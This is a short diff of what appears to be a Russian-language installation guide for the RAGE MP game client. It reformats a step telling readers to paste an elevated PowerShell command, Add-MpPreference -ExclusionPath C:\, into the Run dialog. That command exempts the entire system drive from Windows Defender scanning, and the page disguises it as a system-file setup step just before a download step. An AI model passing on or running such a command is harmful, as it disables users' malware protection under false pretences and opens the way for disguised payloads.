@@ -9,7 +9,8 @@
 Сделайте расширение системных файлов RAGE MP
 
 Нажмите комбинацию Windows+R и введите команду 
-powershell.exe -Command "Start-Process powershell.exe -Verb RunAs -ArgumentList 'Add-MpPreference -ExclusionPath C:\ -Force'"
+
+` powershell.exe -Command "Start-Process powershell.exe -Verb RunAs -ArgumentList 'Add-MpPreference -ExclusionPath C:\ -Force'" `
 
 Шаг 2 📥
 
